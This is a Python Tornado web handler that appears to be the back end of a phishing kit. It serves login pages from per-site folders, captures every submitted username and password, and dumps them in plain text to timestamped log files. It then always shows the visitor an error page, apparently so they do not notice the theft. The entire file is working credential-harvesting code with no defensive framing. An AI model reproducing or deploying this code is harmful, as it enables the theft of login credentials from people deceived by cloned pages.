
import os
import time
import tornado.web


class MainHandler(tornado.web.RequestHandler):

    def initialize(self, page_path: str = ''):
        self.page_path = page_path

    @tornado.web.asynchronous
    # @gen.coroutine
    async def data_received(self, chunk):
        pass

    @tornado.web.asynchronous
    # @gen.coroutine
    async def get(self):
        self.render('../pages/' + self.page_path + 'index.html')

    def post(self):
        try:
            login = self.get_argument('login')
            password = self.get_argument('password')
            try:
                if not os.path.exists('../logs/dump/' + self.page_path):
                    os.mkdir('../logs/dump/' + self.page_path)
                file = open('../logs/dump/' + self.page_path + str(time.time()), mode='a+')
                file.write('../login:' + login + '\npassword:' + password + '\n')
                file.close()
            except IOError:
                print(self.page_path[:-1])
                print('login :', login)
                print('password :', password)
        except tornado.web.HTTPError:   # no or wrong arguments
            pass
        # show an error page to the client
        self.render('../pages/' + self.page_path + 'error.html')
